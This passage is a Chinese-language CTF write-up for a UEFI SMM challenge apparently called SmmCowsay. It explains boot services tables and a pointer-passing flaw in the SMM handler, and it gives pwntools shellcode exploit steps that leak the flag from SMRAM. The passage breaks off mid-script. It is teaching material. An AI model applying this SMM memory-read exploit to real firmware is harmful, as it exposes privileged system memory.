NumberOfTableEntries;</span><br><span class="line">  EFI_CONFIGURATION_TABLE          *ConfigurationTable;</span><br><span class="line">&#125; EFI_SYSTEM_TABLE;</span><br></pre></td></tr></table></figure>
<p>我们现在感兴趣的是 EFI 系统表的 <code>BootServices</code> 字段，它保存指向 EFI 引导服务表的指针（参阅<a target="_blank" rel="noopener" href="https://uefi.org/specs/UEFI/2.10/04_EFI_System_Table.html#efi-boot-services-table">EFI System Table — UEFI Specification documentation</a>）：另一个表保存一堆针对不同 UEFI API 的有用函数指针。</p>
<blockquote>
<p>UEFI uses the EFI Boot Services Table, which contains a table header and pointers to all of the boot services. The definition for this table is shown in the following code fragments. Except for the table header, all elements in the EFI Boot Services Tables are prototypes of function pointers to functions as defined in <a target="_blank" rel="noopener" href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#services-boot-services">Services — Boot Services</a> . The function pointers in this table are not valid after the operating system has taken control of the platform with a call to <a target="_blank" rel="noopener" href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-exitbootservices">EFI_BOOT_SERVICES.ExitBootServices()</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_BOOT_SERVICES_SIGNATURE 0x56524553544f4f42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_BOOT_SERVICES_REVISION EFI_SPECIFICATION_VERSION</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  EFI_TABLE_HEADER     Hdr;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Task Priority Services</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  EFI_RAISE_TPL        RaiseTPL;       <span class="comment">// EFI 1.0+</span></span><br><span class="line">  EFI_RESTORE_TPL      RestoreTPL;     <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Memory Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_ALLOCATE_PAGES   AllocatePages;  <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_FREE_PAGES       FreePages;      <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_GET_MEMORY_MAP   GetMemoryMap;   <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_ALLOCATE_POOL    AllocatePool;   <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_FREE_POOL        FreePool;       <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Event &amp; Timer Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_CREATE_EVENT     CreateEvent;    <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_SET_TIMER        SetTimer;       <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_WAIT_FOR_EVENT   WaitForEvent;   <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_SIGNAL_EVENT     SignalEvent;    <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_CLOSE_EVENT      CloseEvent;     <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_CHECK_EVENT      CheckEvent;     <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Protocol Handler Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_INSTALL_PROTOCOL_INTERFACE     InstallProtocolInterface;            <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_REINSTALL_PROTOCOL_INTERFACE   ReinstallProtocolInterface;          <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_UNINSTALL_PROTOCOL_INTERFACE   UninstallProtocolInterface;          <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_HANDLE_PROTOCOL                HandleProtocol;                      <span class="comment">// EFI 1.0+</span></span><br><span class="line"> VOID*   Reserved;    <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_REGISTER_PROTOCOL_NOTIFY       RegisterProtocolNotify;              <span class="comment">// EFI  1.0+</span></span><br><span class="line">    EFI_LOCATE_HANDLE                  LocateHandle;                        <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_LOCATE_DEVICE_PATH             LocateDevicePath;                    <span class="comment">// EFI 1.0+</span></span><br><span class="line"> EFI_INSTALL_CONFIGURATION_TABLE       InstallConfigurationTable;           <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Image Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_IMAGE_UNLOAD               LoadImage;        <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_IMAGE_START                StartImage;       <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_EXIT                       Exit;             <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_IMAGE_UNLOAD               UnloadImage;      <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_EXIT_BOOT_SERVICES         ExitBootServices; <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Miscellaneous Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_GET_NEXT_MONOTONIC_COUNT   GetNextMonotonicCount; <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_STALL                      Stall;                 <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_SET_WATCHDOG_TIMER         SetWatchdogTimer;      <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// DriverSupport Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_CONNECT_CONTROLLER         ConnectController;     <span class="comment">// EFI 1.1</span></span><br><span class="line">    EFI_DISCONNECT_CONTROLLER      DisconnectController;  <span class="comment">// EFI 1.1+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Open and Close Protocol Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_OPEN_PROTOCOL              OpenProtocol;           <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_CLOSE_PROTOCOL             CloseProtocol;          <span class="comment">// EFI 1.1+</span></span><br><span class="line"> EFI_OPEN_PROTOCOL_INFORMATION     OpenProtocolInformation;<span class="comment">// EFI 1.1+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Library Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_PROTOCOLS_PER_HANDLE       ProtocolsPerHandle;     <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_LOCATE_HANDLE_BUFFER       LocateHandleBuffer;     <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_LOCATE_PROTOCOL            LocateProtocol;         <span class="comment">// EFI 1.1+</span></span><br><span class="line">  EFI_UNINSTALL_MULTIPLE_PROTOCOL_INTERFACES  InstallMultipleProtocolInterfaces;    <span class="comment">// EFI 1.1+</span></span><br><span class="line">  EFI_UNINSTALL_MULTIPLE_PROTOCOL_INTERFACES UninstallMultipleProtocolInterfaces;   <span class="comment">// EFI 1.1+*</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 32-bit CRC Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_CALCULATE_CRC32    CalculateCrc32;     <span class="comment">// EFI 1.1+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Miscellaneous Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_COPY_MEM           CopyMem;        <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_SET_MEM            SetMem;         <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_CREATE_EVENT_EX    CreateEventEx;  <span class="comment">// UEFI 2.0+</span></span><br><span class="line">  &#125; EFI_BOOT_SERVICES;</span><br></pre></td></tr></table></figure>
<h3 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h3><p>尝试一下执行shellcode</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ pwn asm -c amd64 <span class="string">&#x27;mov rax, qword ptr [0x44440000]; mov rbx, qword ptr [0x44440008]&#x27;</span></span><br><span class="line">488b042500004444488b1c2508004444</span><br><span class="line">----- snip -----</span><br><span class="line"></span><br><span class="line">488b042500004444488b1c2508004444</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">Running...</span><br><span class="line">RAX: 0x6E7B667463756975 RBX: 0x2179727420656369 RCX: 0x0000000000000000</span><br><span class="line">...</span><br><span class="line">----- snip -----</span><br><span class="line"></span><br><span class="line">$ python3</span><br><span class="line">&gt;&gt;&gt; (0x6E7B667463756975).to_bytes(8, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">b<span class="string">&#x27;uiuctf&#123;n&#x27;</span></span><br><span class="line">&gt;&gt;&gt; (0x2179727420656369).to_bytes(8, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">b<span class="string">&#x27;ice try!&#x27;</span></span><br></pre></td></tr></table></figure>
<p>QEMU 补丁按预期工作：MMIO 驱动程序发现我们没有从系统管理模式读取内存，并给了我们假标志。即使我们确实可以访问物理内存，我们仍然无法通过在 <code>Binexec.efi</code> 驱动程序中运行代码来读取该标志。我们需要从系统管理模式中读取它。</p>
<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>题目给出了打在uefishell上的patch</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">+VOID</span><br><span class="line">+Cowsay (</span><br><span class="line">+  IN CONST CHAR16 *Message</span><br><span class="line">+  )</span><br><span class="line">+&#123;</span><br><span class="line">+  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span><br><span class="line">+</span><br><span class="line">+  Buffer = AllocateRuntimeZeroPool(<span class="keyword">sizeof</span>(*Buffer) + <span class="keyword">sizeof</span>(CHAR16 *));</span><br><span class="line">+  <span class="keyword">if</span> (!Buffer)</span><br><span class="line">+    <span class="keyword">return</span>;</span><br><span class="line">+</span><br><span class="line">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span><br><span class="line">+  Buffer-&gt;MessageLength = <span class="keyword">sizeof</span>(CHAR16 *);</span><br><span class="line">+  *(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span><br><span class="line">+</span><br><span class="line">+  mSmmCommunication-&gt;Communicate(</span><br><span class="line">+    mSmmCommunication,</span><br><span class="line">+    Buffer,</span><br><span class="line">+    <span class="literal">NULL</span></span><br><span class="line">+  );</span><br></pre></td></tr></table></figure>
<p>如上所述，普通 UEFI 驱动程序可以通过此“SmmCommunication”协议与注册了适当处理程序的 SMM UEFI 驱动程序进行通信，并且数据通过指向 <code>EFI_SMM_COMMUNICATE_HEADER</code> 结构的指针传递：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  EFI_GUID HeaderGuid;</span><br><span class="line">  UINTN MessageLength;</span><br><span class="line">  UINT8 Data[ANYSIZE_ARRAY];</span><br><span class="line">&#125; EFI_SMM_COMMUNICATE_HEADER;</span><br></pre></td></tr></table></figure>
<p>注意到传递的消息实质上一个指针</p>
<p><code>*(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</code></p>
<p>在这种情况下，发送的消息只是一个指针，它按原样复制到 <code>-&gt;Data</code> 数组成员中。换句话说， <code>Binexec.efi</code> 发送一个指向要通过 <code>mSmmCommunication-&gt;Communicate</code> 打印到 <code>SmmCowsay.efi</code> 的字符串的指针。如果我们看一下 <code>SmmCowsay.efi</code> 处理指针，我们可以看到它没有以任何特殊方式处理。它只是按原样传递给打印函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmmCowsayHandler</span> <span class="params">(</span></span><br><span class="line"><span class="params">    IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="params">    IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="params">    IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="params">    IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="params">    )</span></span><br><span class="line">&#123;</span><br><span class="line">    DEBUG ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Enter\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!CommBuffer || !CommBufferSize || *CommBufferSize &lt; <span class="keyword">sizeof</span>(CHAR16 *))</span><br><span class="line">        <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line"></span><br><span class="line">    Cowsay(*(CONST CHAR16 **)CommBuffer); <span class="comment">// &lt;== pointer passed *as is* here</span></span><br><span class="line"></span><br><span class="line">    DEBUG ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Exit\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这意味着我们可以将任意指针传递给 <code>SmmCowsay</code> 驱动程序，它会很乐意为我们读取给定地址处的内存，并将其显示在控制台上，就像它是一个以 NUL 结尾的 <code>CHAR16</code> 的 <code>EFI_SMM_COMMUNICATE_HEADER</code> ，并通过 <code>mSmmCommunication-&gt;Communicate</code> 将其传递给 SMM 驱动程序，我们可以将其获取为我们打印旗帜！</p>
<p>但是我们如何获得这个“SmmCommunication”协议来调用它的 <code>-&gt;Communicate()</code> 方法呢？看一下 <code>Binexec.efi</code> 中的代码， <code>mSmmCommunication</code> 只是将正确的 GUID 传递给 <code>BootServices-&gt;LocateProtocol()</code> 获得的指针，如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status = gBS-&gt;LocateProtocol(</span><br><span class="line">    &amp;gEfiSmmCommunicationProtocolGuid,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    (VOID **)&amp;mSmmCommunication</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
<p>那么我们现在需要做的就是想办法调用cowsay,并将flag的地址作为参数传送</p>
<p>我们需要得到 <code>SystemTable-&gt;BootServices-&gt;LocateProtocol</code> 。理论上，由于 EDK2 没有应用 ASLR，所有地址在我们的工作环境（本地和远程）中都是固定的，因此我们可以获取我们需要的任何函数的地址并直接调用</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="Step-1-get-LocateProtocol"><a href="#Step-1-get-LocateProtocol" class="headerlink" title="Step 1: get LocateProtocol"></a>Step 1: get LocateProtocol</h4><p><code>LocateProtocol</code> 函数在 <code>BootServices</code> 表 ( <code>gBS</code> ) 中提供，实际上我们在 <code>SystemTable</code> 中有一个指针。我们知道 <code>SystemTable</code> 的地址，因为程序将其打印到控制台了,但实际上因为edk2不支持任何aslr技术,所以哪怕不给,也能够调试获得</p>
<p>我们看LocateProtocol函数,其可以根据给定guid定位到protocol或者服务的地址,并将其存储在r8指向的空间(返回一个指向protocol的指针)</p>
<blockquote>
<p><strong>Summary</strong></p>
<p>Returns the first protocol instance that matches the given protocol.</p>
<p><strong>Prototype</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef</span><br><span class="line">EFI_STATUS</span><br><span class="line">(EFIAPI *EFI_LOCATE_PROTOCOL) (</span><br><span class="line">  IN EFI_GUID                            *Protocol,</span><br><span class="line">  IN VOID                                *Registration OPTIONAL,</span><br><span class="line">  OUT VOID                               **Interface</span><br><span class="line"> );</span><br></pre></td></tr></table></figure>
<p><strong>Parameters</strong></p>
<ul>
<li><p>Protocol</p>
<p>Provides the protocol to search for.</p>
</li>
<li><p>Registration</p>
<p>Optional registration key returned from <a target="_blank" rel="noopener" href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html?highlight=locateprotocol#efi-boot-services-registerprotocolnotify">EFI_BOOT_SERVICES.RegisterProtocolNotify()</a> . If <em>Registration</em> is NULL, then it is ignored.</p>
</li>
<li><p>Interface</p>
<p>On return, a pointer to the first interface that matches <em>Protocol</em> and <em>Registration</em>.</p>
</li>
</ul>
<p><strong>Description</strong></p>
<p>The <strong>LocateProtocol</strong>() function finds the first device handle that support <em>Protocol</em>, and returns a pointer to the protocol interface from that handle in <em>Interface</em>. If no protocol instances are found, then <em>Interface</em> is set to NULL.</p>
<p>If <em>Interface</em> is NULL, then EFI_INVALID_PARAMETER is returned.</p>
<p>If <em>Protocol</em> is NULL, then EFI_INVALID_PARAMETER is returned.</p>
<p>If <em>Registration</em> is NULL, and there are no handles in the handle database that support <em>Protocol</em>, then EFI_NOT_FOUND is returned.</p>
<p>If <em>Registration</em> is not NULL, and there are no new handles for <em>Registration</em>, then EFI_NOT_FOUND is returned.</p>
<p><strong>Status Codes Returned</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>EFI_SUCCESS</th>
<th>A protocol instance matching <em>Protocol</em> was found and returned in <em>Interface</em>.</th>
</tr>
</thead>
<tbody>
<tr>
<td>EFI_INVALID_PARAMETER</td>
<td><em>Interface</em> is NULL. <em>Protocol</em> is NULL.</td>
</tr>
<tr>
<td>EFI_NOT_FOUND</td>
<td>No protocol instances were found that match Protocol and <em>Registration</em>.</td>
</tr>
</tbody>
</table>
</div>
</blockquote>
<p>我们首先通过几个简单的mov获得protocol的地址</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;system_table&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 96]  /* SystemTable-&gt;BootServices */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 64]  /* BootServices-&gt;AllocatePool */</span></span><br><span class="line"><span class="string">    mov rcx, qword ptr [rax + 320] /* BootServices-&gt;LocateProtocol */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">AllocatePool = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>) <span class="comment"># useful for later</span></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RCX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;BootServices-&gt;AllocatePool   @ 0x%x&#x27;</span>, AllocatePool)</span><br><span class="line">log.success(<span class="string">&#x27;BootServices-&gt;LocateProtocol @ 0x%x&#x27;</span>, LocateProtocol)</span><br></pre></td></tr></table></figure>
<p>可以看到我们还获取了一个指针<code>BootServices-&gt;AllocatePool</code>,这个之后再说</p>
<h4 id="Step-2-get-mSmmCommunication"><a href="#Step-2-get-mSmmCommunication" class="headerlink" title="Step 2: get mSmmCommunication"></a>Step 2: get mSmmCommunication</h4><p>现在为了定位 <code>mSmmCommunication</code> 我们需要将一个指向协议 GUID 的指针传递给 <code>LocateProtocol</code> ，以及一个指向应存储结果指针的位置的指针。我们已经有一个可用的 RWX 内存区域（编写 shellcode 的区域），所以我们使用它。</p>
<p>此外,EDK2 的补丁 <code>0005-PiSmmCpuDxeSmm-Open-up-all-the-page-table-access-res.patch</code> 将页表的所有条目设置为 RWX : )</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Taken from EDK2 source code (or opening Binexec.efi in a disassembler)</span></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = <span class="number">0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">    lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">guid:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCommunicationProtocolGuid&#125;</span></span></span><br><span class="line"><span class="string">protocol:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">mSmmCommunication = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">Communicate = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;mSmmCommunication              @ 0x%x&#x27;</span>, mSmmCommunication)</span><br><span class="line">log.success(<span class="string">&#x27;mSmmCommunication-&gt;Communicate @ 0x%x&#x27;</span>, Communicate)</span><br></pre></td></tr></table></figure>
<h4 id="Step-3-getflag"><a href="#Step-3-getflag" class="headerlink" title="Step 3: getflag"></a>Step 3: getflag</h4><p>现在，我们可以为 <code>SmmCowsay</code> 制作一条消息，其中包含指向标志的指针，并让它通过使用正确的参数调用 <code>mSmmCommunication-&gt;Communicate</code> 来为我们打印它。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Taken from 0003-SmmCowsay-Vulnerable-Cowsay.patch</span></span><br><span class="line">gEfiSmmCowsayCommunicationGuid = <span class="number">0xf79265547535a8b54d102c839a75cf12</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, &amp;buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    lea rdx, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 